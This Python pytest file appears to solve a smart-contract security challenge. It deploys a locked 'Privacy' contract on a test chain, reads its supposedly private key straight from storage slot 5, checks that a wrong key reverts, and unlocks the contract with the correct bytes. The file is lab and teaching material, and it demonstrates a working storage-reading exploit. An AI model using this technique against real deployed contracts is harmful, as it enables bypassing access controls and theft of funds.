import os

import pytest

from sc_test_utils import get_web3_instance, load_w3_contract
from web3.exceptions import ContractLogicError


@pytest.fixture(scope="module")
def setup_module():
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    parent_dir = os.path.dirname(os.getcwd())
    challenge_dir = os.path.join(parent_dir, file_name[5:-3])
    w3 = get_web3_instance()
    data = [b'<vHa\xdb\xb0\xa4_\x157\xb9\x04\x1b\xde\x078\xb4\xfc\xff\xd8\xe0\xdf\x15\xc0\x18\x06?9\nd\xfe\xcf',
            b'\xd3H\xe5\xbc\x99l\xb7\xdf\xe0S\x07\xc8R\xd2\x06v\xfe\xd2hM\x86\xd9\xeb\x84v\xa3\xfb\x89k\xa3H\xe8',
            b'9\xf9\x18&<\t*\xcc\x96n\x7f\xc0M\xab<\x1d\xa2\xaa\xf6\xb8\x89g\xe0\xb7M\xdd\xba\t\xce\xd7\x1b-']
    privacy_contract = load_w3_contract(challenge_dir, version='0.8.0', constructor_args=[data])
    yield w3, privacy_contract
    print(f"\nTearing down the module: {file_name}")

def test_privacy_exploit(setup_module):
    w3, privacy_contract = setup_module
    assert privacy_contract.functions.locked().call()
    slot = 5  # checked that the key to unlock, is stored at slot 5
    data = w3.eth.get_storage_at(privacy_contract.address, slot)

    with pytest.raises(ContractLogicError) as reverted:
        negative_test_key = data[16:]  # Can be any random key that just match solidity's bytes16
        privacy_contract.functions.unlock(negative_test_key).transact()

    assert ("execution reverted" in str(reverted.value))
    print('Asserted revert() when wrong key is sent:', reverted)

    key = data[:16]
    tx = privacy_contract.functions.unlock(key).transact()
    tx = w3.eth.wait_for_transaction_receipt(tx)
    assert tx.status == 1
    unlocked = not privacy_contract.functions.locked().call()
    assert unlocked
    print(f"Tested Privacy contract unlock: {unlocked}")
